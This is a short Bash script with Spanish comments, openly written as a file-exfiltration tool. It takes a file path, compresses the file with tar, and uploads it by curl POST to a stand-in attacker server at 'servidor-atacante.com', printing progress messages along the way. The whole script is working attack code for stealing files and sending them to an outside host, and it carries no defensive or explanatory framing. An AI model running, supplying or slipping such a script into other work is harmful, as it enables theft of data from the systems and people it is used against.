#!/bin/bash

# Verificar si se ha proporcionado un archivo para exfiltrar
if [ -z "$1" ]; then
    echo "Uso: $0 <archivo_para_exfiltrar>"
    exit 1
fi

# Definir variables
ARCHIVO=$1
URL="http://servidor-atacante.com/upload"

# Verificar si el archivo existe
if [ ! -f "$ARCHIVO" ]; then
    echo "El archivo $ARCHIVO no existe."
    exit 1
fi

# Paso 1: Comprimir el archivo (si es necesario)
echo "[+] Comprimiendo el archivo $ARCHIVO..."
tar -czf $ARCHIVO.tar.gz $ARCHIVO

# Paso 2: Exfiltrar el archivo comprimido mediante HTTP POST
echo "[+] Exfiltrando archivo a $URL..."
curl -X POST -F "file=@$ARCHIVO.tar.gz" $URL

echo "[+] Exfiltraci√≥n completada."
